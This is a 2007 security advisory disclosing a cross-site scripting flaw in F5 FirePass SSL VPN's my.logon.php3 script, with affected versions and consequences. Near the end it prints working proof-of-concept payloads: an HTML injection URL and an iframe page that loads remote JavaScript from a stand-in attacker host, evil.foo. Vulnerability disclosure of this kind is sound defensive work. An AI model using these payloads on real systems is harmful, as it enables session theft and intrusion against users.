PR07-15: Cross-site Scripting (XSS) / HTML injection on F5 FirePass 4100 SSL VPN 'my.logon.php3' server-side script

Date Found: 19th June 2007

Successfully tested on: version 5.5.2

F5 Networks has confirmed the following versions to be vulnerable:

FirePass versions 5.4.1 - 5.5.2
FirePass versions 6.0 - 6.0.1


Description:

F5 Networks FirePass 4100 SSL VPN is vulnerable to XSS within the "my.logon.php3" server-side script.

No authentication is required to exploit this vulnerability.


Consequences:

An attacker may be able to cause execution of malicious scripting code in the browser of a user who visits a specially-crafted URL to an F5 Firepass device, or visits a malicious page that makes a request to such URL. Such code would run within the security context of the target domain.

This type of attack can result in non-persistent defacement of the target site, or the redirection of confidential information (i.e. admin session IDs) to unauthorised third parties. 


Proof of concept (PoC) URL:

https://target.tld/my.logon.php3?"></script><textarea>HTML_injection_test</textarea><!--

The payload in the example is 

"></script><textarea>HTML_injection_test</textarea><!--

which injects a 'textarea' box


The following PoC HTML page would run JavaScript without any restrictions from a third-party file ('http://www.evil.foo/b' in this case):

<html>

<iframe src="https://target.tld/my.logon.php3?%22%3E%3C/script%3E%3Cscript%3Eeval%28name%29%3C/script%3E%3C%21--" width="0%" height="0%" name="xss=document.body.appendChild(document.createElement('script'));xss.setAttribute('src','http://www.evil.foo/b')"></iframe>

</html>
